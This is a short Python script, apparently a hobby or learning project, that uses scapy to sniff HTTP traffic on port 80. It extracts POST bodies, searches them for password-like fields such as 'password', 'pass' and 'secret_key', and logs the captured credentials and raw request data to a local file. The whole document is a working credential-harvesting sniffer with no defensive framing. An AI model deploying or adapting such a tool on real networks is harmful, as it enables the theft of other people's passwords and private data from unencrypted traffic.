
from scapy.all import *
from scapy.layers.http import HTTPRequest
import re

def detect_password(info):

    file = open('log_folder\\http_post_log.txt', 'a')
    pass_detected = False
    info = info.decode('utf_8')

    pass_key_list = ['password', 'pass', 'upass', 'pass_key', 'secret_key']

    for code in pass_key_list:
        x = re.search(f'(({code})=(\S)*(?=&)?)', info)
        if x:
            x = x.group(0)
            file.write(f'pass_key: {x.split("=")[0]}       pass_value: {x.split("=")[1]}\n')
            file.write(f'raw data: {info}\n\n')
            file.close()
            pass_detected = True
            break

    if not pass_detected:
        file.write('no password detected\n')
        file.write(f'raw data: {info}\n\n')
        file.close()


def sniff_packets():
    sniff(prn=process_packet, filter='port 80', )

def process_packet(packet):

    if packet.haslayer(HTTPRequest):
        method = packet[HTTPRequest].Method.decode()
        if packet.haslayer(Raw) and method == "POST":

            detect_password(packet[Raw].load)
